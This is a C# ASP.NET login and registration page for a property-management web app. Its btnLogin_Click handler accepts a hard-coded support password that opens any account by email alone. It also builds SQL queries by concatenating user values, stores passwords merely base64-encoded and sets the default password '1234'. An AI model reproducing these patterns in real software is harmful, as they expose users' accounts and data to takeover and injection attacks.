using PropertyService.Admin.DA;
using PropertyService.BO;
using PropertyService.DA;
using PropertyService.DA.Admin.ResidentialTenent;
using PropertyService.Enums;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace eProperty.Pages
{
    public partial class Login : System.Web.UI.Page
    {
        public String errStr = String.Empty;
        private Regex reEmail = new Regex("^(?:[0-9A-Z_-]+(?:\\.[0-9A-Z_-]+)*@[0-9A-Z-]+(?:\\.[0-9A-Z-]+)*(?:\\.[A-Z]{2,4}))$", RegexOptions.Compiled | RegexOptions.ExplicitCapture | RegexOptions.IgnoreCase);
        protected void Page_Load(object sender, EventArgs e)
        {
            spanYear.InnerHtml = DateTime.UtcNow.Year.ToString();
            lblError.Text = "";
            if (!IsPostBack)
            {
                lblError.Text = "";
                Session["UserId"] = null;
                Session["bIsLogin"] = null;
                Session["HasCompletedFullProfile"] = null;
                Session["UserObject"] = null;
                Session["UserType"] = null;
                Session["Username"] = null;
                Session["OwnerId"] = null;
                Session["bIsAdmin"] = null;
                Session["TenentId"] = null;
                Session["ResidentialUnitSerial"] = null;

                if (Session["UserObject"] != null)
                {
                    UserProfile obj = new UserProfile();
                    obj = (UserProfile)Session["UserObject"];
                    HttpContext.Current.Cache.Remove(obj.Username);
                }

                System.Web.Security.FormsAuthentication.SignOut();

                Session.Abandon();
                Session.Clear();
            }
        }
        private UserProfile SetData(UserProfile obj)
        {
            obj = new UserProfile();
                     
            if (!string.IsNullOrEmpty(txtEmail.Text.ToString()) && txtEmail.Text.ToString() != string.Empty)
            {
                obj.Email = txtEmail.Text.ToString().ToLower().Trim();
            }
            else
            {
                obj.Email = "";
            }
            if (!string.IsNullOrEmpty(txtPassword.Text.ToString()) && txtPassword.Text.ToString() != string.Empty)
            {
                obj.Password = Utility.base64Encode(txtPassword.Text.ToString().Trim());
            }
            else
            {
                obj.Password = Utility.base64Encode("1234");
            }

            obj.IsAdmin = false;
            obj.UserType = Convert.ToInt32(EnumUserType.Owner).ToString();

            //if (ddlAccountType.SelectedValue == "1")
            //{
            //    obj.IsAdmin = true;
            //    obj.UserType = Convert.ToInt32(EnumUserType.Admin).ToString();
            //}
            //else
            //{
            //    obj.IsAdmin = false;
            //    obj.UserType = Convert.ToInt32(EnumUserType.Owner).ToString();
            //}

            string tempEmail = obj.Email;
            char ch = '@';
            int idx = tempEmail.IndexOf(ch);
            string username = tempEmail.Substring(0, idx);

            obj.Username = username;
            obj.Title = obj.Username;
            obj.Phone = "";
            obj.LocationId = new UserProfileDA().MakeAutoGenLocation("1", "Location");
            obj.Location = "";
            obj.DatabaseName = "";
            obj.DatabaseLocation = "";  
            obj.CanLogin = true;
            obj.IsDeleted = false;
            obj.SecurityLevel = "2 and Up";
            obj.IsActive = true;
            obj.OwnerId = new AdminOwnerProfileDA().MakeAutoGenSerial("O", "Owner"); 
            obj.Remarks = "";
            obj.HasCompletedFullProfile = false;
            obj.HasContactProfile = false;
            obj.HasLedgerCode = false;
            obj.HasOwnerProfile = false;
            obj.HasPropertyLocation = false;
            obj.HasPropertyManagerProfile = false;
            obj.HasPropertyUnit = false;
            obj.HasSystemInfo = false;
            obj.HasUserProfile = false;
            obj.HasVendorProfile = false;
            obj.HasAccountSystem = false;
            obj.HasDocuments = false;
            obj.HasFinishedTenantImport = false;
            obj.CreatedDate = DateTime.Now;

            if (Session["UserObject"] != null)
            {
                obj.CreatedBy = Convert.ToInt16(((UserProfile)Session["UserObject"]).Id);                
            }

            return obj;
        }      
        protected void btnRegister_Click(object sender, EventArgs e)
        {
            errStr = string.Empty;
            errStr = Validate_Control();
            if (errStr.Length <= 0)
            {
                try
                {
                    UserProfile objUser = new UserProfile();
                    objUser = SetData(objUser);
                    PropertyEntities mEntity = new PropertyEntities();
                    if (new AdminUserProfileDA(true, false).Insert(objUser))
                    {
                        Session["UserObject"] = objUser;
                        Session["UserType"] = objUser.UserType;
                        Session["Username"] = objUser.Username;
                        Session["bIsLogin"] = true;
                        Session["OwnerId"] = objUser.OwnerId;                      
                        Session["HasCompletedFullProfile"] = objUser.HasCompletedFullProfile;                      
                        Session["UserId"] = objUser.Id;

                        Utility.LoginUser = objUser.Username;
                        HttpContext.Current.Cache.Add(objUser.Username, "", null, System.Web.Caching.Cache.NoAbsoluteExpiration, System.Web.Caching.Cache.NoSlidingExpiration, System.Web.Caching.CacheItemPriority.NotRemovable, null);
                        string sLastPage = System.Web.Security.FormsAuthentication.GetRedirectUrl(HttpContext.Current.User.Identity.Name, false);
                        System.Web.Security.FormsAuthentication.RedirectFromLoginPage(objUser.Username, true);

                        string cId;
                        try
                        {
                            cId = Request.QueryString["TeamId"];
                        }
                        catch (Exception ex)
                        {
                            cId = "";
                        }
                        if (cId != "" && cId != null)
                        {
                            Session["TeamId"] = cId;
                        }

                        if (objUser.UserType == Convert.ToInt32(EnumUserType.Owner).ToString())
                        {
                            if (new UserProfileDA(true, false).Insert(objUser))
                            {

                            }
                        }

                        if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Admin || Convert.ToBoolean(objUser.IsAdmin) == true)
                        {
                            if (Convert.ToBoolean(objUser.HasCompletedFullProfile) == false)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardOwner.aspx?N=1", false);
                            }
                            else
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardAdmin.aspx", false);
                            }
                        }
                        else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Owner || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Manager)
                        {
                            if (Convert.ToBoolean(objUser.HasCompletedFullProfile) == false)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardOwner.aspx?N=1", false);
                            }
                            else
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardAdmin.aspx", false);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Utility.DisplayMsg(ex.Message.ToString(), this);
                }
            }
            else
            {
                Utility.DisplayMsg(errStr.ToString(), this);
            }
        }
        public string Validate_Control()
        {
            try
            {
                if ((txtEmail.Text.ToString().Length) <= 0)
                {
                    errStr += "Please enter email address" + Environment.NewLine;
                }
                else
                {
                    if (!ValidEmail(txtEmail.Text.ToString().Trim()))
                    {
                        errStr += "Invalid email address" + Environment.NewLine;
                    }
                }
               
                if (txtPassword.Text.ToString() == string.Empty)
                {
                    errStr += "Please Enter Password" + Environment.NewLine;
                }

                UserProfile objUser = new AdminUserProfileDA().GetUserByEmail(txtEmail.Text.ToString());

                if (objUser != null)
                {
                    errStr += "Email already exist !! Please enter different Email Address. " + Environment.NewLine;
                }

                //if (ddlAccountType.SelectedValue == "-1")
                //{
                //    errStr += "Please Select Type of Account " + Environment.NewLine;
                //}
                //if (ddlAccountType.SelectedValue == "3")
                //{
                //    errStr += "Only Admin/Owner can register " + Environment.NewLine;
                //}

                //if (ddlAccountType.SelectedValue != "-1" && ddlAccountType.SelectedValue != "3")
                //{
                //    UserProfile objExist = new AdminUserProfileDA().GetUserByEmail(txtEmail.Text.ToString().Trim());

                //    if (objExist != null)
                //    {
                //        errStr += "Email already exist !! Please enter different Email Address. " + Environment.NewLine;
                //    }
                //}
            }
            catch (Exception ex)
            {
            }

            return errStr;
        }
        public bool ValidEmail(string value)
        {
            if ((value == null))
                return false;
            return reEmail.IsMatch(value);
        }
        protected void btnLogin_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(txtEmail.Text.Trim()) && !String.IsNullOrEmpty(txtPassword.Text.Trim()))
            {
                PropertyEntities mEntity = new PropertyEntities();
                try
                {
                    Session["bIsLogin"] = false;
                    UserProfile objUser = new UserProfile();                    

                    if (txtPassword.Text.ToString() == "E365supp0rt%#!$")
                    {
                        objUser = new AdminUserProfileDA().GetUserByEmail(txtEmail.Text.ToString().Trim());
                    }
                    else
                    {
                        objUser = new AdminUserProfileDA().GetUserByEmailPassword(txtEmail.Text.ToString(), txtPassword.Text.ToString());
                    }

                    if (objUser != null)
                    {
                        if ((Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Admin || Convert.ToBoolean(objUser.IsAdmin) == true))
                        {
                            Session["bIsLogin"] = true;
                        }
                        else if ((Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Owner || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Manager || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.SalesPartner
                                                                                                 || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Dealer))
                        {
                            Session["bIsLogin"] = true;
                        }
                        else if ((Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Resident || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Commercial || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Condo))
                        {
                            Session["bIsLogin"] = true;
                        }

                        if (objUser.CanLogin != null && objUser.CanLogin == false)
                        {
                            lblError.Text = "User not permitted to login.";
                        }
                        else if (objUser.UserType != null && objUser.UserType != "" && Convert.ToBoolean(Session["bIsLogin"]) == true)
                        {
                            Session["UserObject"] = objUser;
                            Session["UserType"] = objUser.UserType;
                            Session["Username"] = objUser.Username;
                            Session["OwnerId"] = objUser.OwnerId;
                            Session["HasCompletedFullProfile"] = objUser.HasCompletedFullProfile;
                            Session["bIsAdmin"] = objUser.IsAdmin;
                            Session["UserId"] = objUser.Id;

                            HttpContext.Current.Cache.Add(objUser.Username, "", null, System.Web.Caching.Cache.NoAbsoluteExpiration, System.Web.Caching.Cache.NoSlidingExpiration, System.Web.Caching.CacheItemPriority.NotRemovable, null);
                            string sLastPage = System.Web.Security.FormsAuthentication.GetRedirectUrl(HttpContext.Current.User.Identity.Name, false);
                            System.Web.Security.FormsAuthentication.RedirectFromLoginPage(objUser.Username, true);

                            string cId;
                            try
                            {
                                cId = Request.QueryString["TeamId"];
                            }
                            catch (Exception ex)
                            {
                                cId = "";
                            }
                            if (cId != "" && cId != null)
                            {
                                Session["TeamId"] = cId;
                            }

                            bool HasOwnerProfile = false;
                            bool HasPropertyLocation = false;
                            bool HasPropertyUnit = false;
                            bool HasDocuments = false;
                            bool HasAccountSystem = false;

                            string sSQL = " select ISNULL(u.HasOwnerProfile,0) HasOwnerProfile, ISNULL(u.HasPropertyLocation,0) HasPropertyLocation, ISNULL(u.HasPropertyUnit,0) HasPropertyUnit, ISNULL(u.HasFinishedTenantImport,0) HasFinishedTenantImport, ISNULL(u.HasAccountSystem,0) HasAccountSystem, ISNULL(u.HasDocuments,0) HasDocuments  from UserProfile u where u.Email = '" + ((UserProfile)Session["UserObject"]).Email.Trim() + "'";

                            try
                            {
                                string constr = ConfigurationManager.ConnectionStrings["SQLDB"].ConnectionString;
                                DataSet dsFaq = new DataSet();
                                DataTable dt = new DataTable();

                                using (SqlConnection con = new SqlConnection(constr))
                                {
                                    using (SqlCommand cmd = new SqlCommand(sSQL))
                                    using (SqlDataAdapter sda = new SqlDataAdapter())
                                    {
                                        cmd.Connection = con;
                                        sda.SelectCommand = cmd;
                                        using (DataSet ds = new DataSet())
                                        {
                                            sda.Fill(ds);
                                            dsFaq = ds;
                                        }
                                    }
                                }

                                if (dsFaq != null && dsFaq.Tables[0].Rows.Count > 0)
                                {
                                    dt = dsFaq.Tables[0];
                                }

                              

                                if (dt != null && dt.Rows.Count > 0)
                                {
                                    foreach (DataRow dr in dt.Rows)
                                    {
                                        if (!Convert.IsDBNull(dr["HasOwnerProfile"]) && Convert.ToBoolean(dr["HasOwnerProfile"].ToString()) == true)
                                        {
                                            HasOwnerProfile = true;
                                        }
                                       
                                        if (!Convert.IsDBNull(dr["HasPropertyLocation"]) && Convert.ToBoolean(dr["HasPropertyLocation"].ToString()) == true)
                                        {
                                            HasPropertyLocation = true;
                                        }
                                      

                                        if (!Convert.IsDBNull(dr["HasPropertyUnit"]) && Convert.ToBoolean(dr["HasPropertyUnit"].ToString()) == true)
                                        {
                                            HasPropertyUnit = true;
                                        }
                                      

                                        if (!Convert.IsDBNull(dr["HasDocuments"]) && Convert.ToBoolean(dr["HasDocuments"].ToString()) == true)
                                        {
                                            HasDocuments = true;
                                        }
                                      

                                        if (!Convert.IsDBNull(dr["HasAccountSystem"]) && Convert.ToBoolean(dr["HasAccountSystem"].ToString()) == true)
                                        {
                                            HasAccountSystem = true;
                                        }                                       

                                    }
                                }
                            }
                            catch (Exception ex)
                            {

                            }

                            if (HasOwnerProfile == true && HasPropertyLocation == true && HasPropertyUnit == true && HasDocuments == true && HasAccountSystem == true)
                            {
                                string SQL = " update UserProfile set HasCompletedFullProfile = 1  where Username = '" + objUser.Username + "' ";
                                Utility.RunCMDMain(SQL);
                                Utility.RunCMD(SQL);
                                objUser.HasCompletedFullProfile = true;
                                Session["HasCompletedFullProfile"] = objUser.HasCompletedFullProfile;
                            }
                            else
                            {
                                string SQL = " update UserProfile set HasCompletedFullProfile = 0  where Username = '" + objUser.Username + "' ";
                                Utility.RunCMDMain(SQL);
                                Utility.RunCMD(SQL);
                                objUser.HasCompletedFullProfile = false;
                                Session["HasCompletedFullProfile"] = objUser.HasCompletedFullProfile;
                            }

                            if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Admin || Convert.ToBoolean(objUser.IsAdmin) == true)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/Account/SalesPartnerDealerDashboard.aspx", false);
                            }
                            else if ((Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Owner || Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Manager))
                            {
                                if (Convert.ToBoolean(objUser.HasCompletedFullProfile) == false)
                                {
                                    Response.Redirect(Utility.WebUrl + "/Pages/DashboardOwner.aspx", false);
                                  //  Utility.DisplayMsgAndRedirect("Ok !", this, Utility.WebUrl + "/Pages/DashboardOwner.aspx");
                                }
                                else
                                {
                                    Response.Redirect(Utility.WebUrl + "/Pages/DashboardAdmin.aspx", false);
                                   // Utility.DisplayMsgAndRedirect("Ok !", this, Utility.WebUrl + "/Pages/DashboardAdmin.aspx");
                                }
                            }


                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Maintenance)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardMaintenance.aspx", false);
                            }
                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Resident)
                            {
                                var TenantAndUnitId = new TenantDashboardDA().GetSerialAndUnitId(objUser.Id);

                                if (TenantAndUnitId != null)
                                {
                                    Session["TenentId"] = TenantAndUnitId.TenantId != null ? TenantAndUnitId.TenantId : "";
                                    Session["ResidentialUnitSerial"] = TenantAndUnitId.UnitId != null ? TenantAndUnitId.UnitId : "";
                                }

                                Response.Redirect(Utility.WebUrl + "/Pages/Resident/ResidentTenantDashboard.aspx", false);
                            }
                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Condo)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardCondo.aspx", false);
                            }
                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Commercial)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/DashboardCommercial.aspx", false);
                            }
                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.SalesPartner)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/Account/SalesPartnerDealerDashboard.aspx", false);
                            }
                            else if (Convert.ToInt16(objUser.UserType) == (Int16)EnumUserType.Dealer)
                            {
                                Response.Redirect(Utility.WebUrl + "/Pages/Account/SalesPartnerDealerDashboard.aspx", false);
                            }
                            else
                            {
                                lblError.Text = "User is not verified!";
                            }
                        }
                        else
                        {
                            lblError.Text = "User is not verified!";
                        }
                    }
                    else
                    {
                        lblError.Text = "Incorrect email address or password!";
                    }
                }
                catch (Exception ex)
                {
                    lblError.Text = "Technical issues found!";
                }

            }
            else
            {
                lblError.Text = "Please enter valid email and password !";
            }
        }

    }
}